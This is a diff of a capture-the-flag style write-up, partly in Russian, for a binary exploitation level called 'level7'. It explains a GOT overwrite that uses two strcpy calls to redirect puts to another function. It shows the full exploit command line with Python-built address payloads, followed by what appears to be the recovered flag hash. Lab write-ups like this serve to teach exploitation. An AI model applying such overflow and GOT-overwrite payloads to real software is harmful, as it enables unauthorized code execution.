@@ -57,9 +57,12 @@ fs             0x0      0
 gs             0x33     51
 
 4. Готовим payload и запускаем программу
+В итоге наше решение использует первый strcpy, чтобы указать адрес в таблице GOT, который нужно переписать, а второй, чтобы поменять его значение
 
-argv[1] = "a" * 20 + "puts GOT addr"
+a * 20 + puts address in GOT
+m 
+argv[1] -> "a" * 20 + "puts GOT addr"
 argv[2] -> puts GOT addr = "m addr"
-TODO:: why does it work?
+
 ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
